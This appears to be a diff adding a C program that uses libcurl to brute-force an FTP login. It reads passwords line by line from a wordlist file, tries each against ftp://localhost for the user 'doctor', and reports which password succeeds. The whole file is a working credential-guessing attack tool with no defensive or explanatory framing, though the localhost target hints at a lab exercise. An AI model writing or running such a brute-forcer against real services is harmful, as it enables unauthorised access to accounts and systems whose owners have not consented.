@@ -1,0 +1,73 @@
+#include <curl/curl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_PASSWORD_LENGTH 100
+
+int main(void) {
+    CURL *curl;
+    CURLcode res;
+    FILE *password_file;
+    char password[MAX_PASSWORD_LENGTH];
+    char userpwd[MAX_PASSWORD_LENGTH + 10];  // Username:password format
+    int success = 0;
+
+    // Initialize libcurl
+    curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error initializing libcurl\n");
+        return EXIT_FAILURE;
+    }
+
+    // Open the password file
+    password_file = fopen("passwords.txt", "r");
+    if (!password_file) {
+        fprintf(stderr, "Error opening password file\n");
+        curl_easy_cleanup(curl);
+        return EXIT_FAILURE;
+    }
+
+    // Set FTP server address and port
+    curl_easy_setopt(curl, CURLOPT_URL, "ftp://localhost");
+
+    // Disable verbose mode
+    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
+
+    // Read passwords from the file and try to connect
+    while (fgets(password, MAX_PASSWORD_LENGTH, password_file) != NULL) {
+        // Remove trailing newline character
+        password[strcspn(password, "\n")] = '\0';
+
+        // Construct the username:password string
+        snprintf(userpwd, sizeof(userpwd), "doctor:%s", password);
+
+        // Set username and password
+        curl_easy_setopt(curl, CURLOPT_USERPWD, userpwd);
+
+        // Try to connect to the FTP server
+        res = curl_easy_perform(curl);
+
+        // Check if login was successful
+        if (res == CURLE_OK) {
+            printf("Successful login with password: %s\n", password);
+            success = 1;
+            break;
+        } else {
+            printf("Login failed with password: %s\n", password);
+        }
+    }
+
+    // Close the password file
+    fclose(password_file);
+
+    // Check if login was successful
+    if (!success) {
+        printf("No password found for user 'doctor'\n");
+    }
+
+    // Cleanup
+    curl_easy_cleanup(curl);
+
+    return EXIT_SUCCESS;
+}
